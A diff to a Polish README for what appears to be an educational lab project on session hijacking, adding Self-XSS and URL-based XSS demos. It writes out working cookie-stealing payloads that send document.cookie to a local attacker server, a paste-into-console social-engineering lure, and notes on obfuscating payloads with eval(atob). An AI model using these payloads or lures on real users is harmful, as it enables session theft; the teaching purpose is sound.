@@ -31,6 +31,47 @@ python payload\session_hijack.py
 ### 4. Monitoruj serwer atakującego
 Otwórz http://localhost:8888 w przeglądarce aby zobaczyć panel z przechwyconymi ciasteczkami.
 
+### 5. (Opcjonalnie) Testuj payloady Self-XSS
+Demonstracja ataków przez konsolę DevTools - zobacz `payload/DEVTOOLS_DEMO.md` dla szczegółów.
+
+**⚠️ UWAGA:** Wszystkie payloady są w formacie **ONE-LINE** (jedna linia) - tak działają prawdziwe ataki Self-XSS, ponieważ konsola DevTools wykonuje kod po naciśnięciu Enter.
+
+**Wersje do testowania:**
+
+**A) Payloady OBFUSKOWANE (zakodowane)** 🔐
+Otwórz `payload/obfuscated_showcase.html` - pokazuje jak atakujący **ukrywają** złośliwy kod:
+- Base64 encoding: `eval(atob('...'))`
+- Double encoding: Base64 + URL encoding
+- String reversal: kod zapisany od tyłu
+- **93 znaki** - najlepszy balans długość/obfuskacja
+- Trudne do odczytania bez dekodowania
+
+**B) Payloady CZYTELNE (do nauki)**
+Zobacz `payload/devtools_payloads.js` - wersje czytelne + obfuskowane dla porównania
+
+**Jak testować:**
+1. Zaloguj się do http://localhost:5009 (admin/admin)
+2. Otwórz DevTools (F12) → zakładka Console
+3. Wklej payload (skopiuj całą linię)
+4. Naciśnij Enter
+5. Obserwuj przechwycone ciasteczko na http://localhost:8888
+
+### 6. (Opcjonalnie) Testuj payloady URL-Based XSS
+Demonstracja ataków przez złośliwe linki - ofiara klika/wkleja link, który kradnie ciasteczka.
+
+**Interaktywna strona:**
+Otwórz `payload/url_xss_showcase.html` w przeglądarce:
+- 10 różnych technik XSS w URL
+- Scenariusze social engineeringu
+- Przyciski kopiowania i testowania
+- Każdy payload z wyjaśnieniem
+
+**Jak działa:**
+1. Atakujący wysyła ofierze link (email, SMS, social media)
+2. Link zawiera payload XSS w parametrach URL
+3. Gdy ofiara otwiera link, JavaScript wykonuje się automatycznie
+4. Ciasteczko jest wysyłane do serwera atakującego (http://localhost:8888)
+
 ## 📂 Struktura projektu
 
 ```
@@ -52,7 +93,14 @@ PCYB_Projekt/
 │   └── requirements.txt         # Zależności Python
 │
 └── payload/                     # Exploit/payload
-    ├── session_hijack.py        # Skrypt demonstracyjny ataku
+    ├── session_hijack.py        # Skrypt demonstracyjny ataku (Python)
+    ├── devtools_payloads.js     # Payloady Self-XSS (czytelne + obfuskowane)
+    ├── obfuscated_payloads.js   # Kolekcja zakodowanych payloadów (20 wersji)
+    ├── obfuscated_showcase.html # Interaktywna demo obfuskacji ⭐
+    ├── url_xss_payloads.js      # Payloady XSS w URL (referencja)
+    ├── url_xss_showcase.html    # Interaktywna strona z payloadami URL-XSS
+    ├── DEVTOOLS_DEMO.md         # Instrukcje testowania Self-XSS
+    ├── FORMATTING_EXAMPLES.md   # Wyjaśnienie ONE-LINE vs MULTI-LINE
     └── requirements.txt         # Zależności dla exploita
 ```
 
@@ -89,15 +137,36 @@ session.cookies.set("PCYB_forum_session", "admin_session_token_pcyb")
 # ✓ Natychmiastowy dostęp bez uwierzytelnienia
 ```
 
-### 2. **Kradzież cookie przez XSS**
+### 2. **Kradzież cookie przez XSS / Self-XSS**
 Symulacja wycieku przez JavaScript (możliwe bo `httponly=False`):
+
+**Wektor A - XSS Injection:**
 ```html
 <script>
   // Ciasteczko dostępne przez JavaScript
   fetch('http://localhost:8888/steal?cookie=' + document.cookie);
 </script>
 ```
+
+**Wektor B - Self-XSS (Social Engineering):**
+Atakujący oszukuje użytkownika aby wkleił kod do konsoli DevTools:
+```javascript
+// "Wklej ten kod aby odblokować funkcje premium!"
+new Image().src='http://localhost:8888/steal?cookie='+document.cookie;
+```
+
+**Wektor C - URL-Based XSS:**
+Atakujący wysyła link zawierający payload w parametrach URL:
+```
+http://localhost:5009/protected?search=<img src=x onerror="fetch('http://localhost:8888/steal?cookie='+document.cookie)">
+```
+Gdy ofiara klika link → XSS wykonuje się → ciasteczko wykradzione
+
 W konsoli przeglądarki: `console.log(document.cookie)` - wyświetla sesję!
+
+📝 **Szczegółowe payloady i instrukcje:** 
+- Self-XSS: zobacz `payload/DEVTOOLS_DEMO.md` lub `payload/payloads_showcase.html`
+- URL-XSS: zobacz `payload/url_xss_showcase.html`
 
 ### 3. **Network Sniffing / MITM**
 Ponieważ `secure=False`, cookie przesyłane przez HTTP:
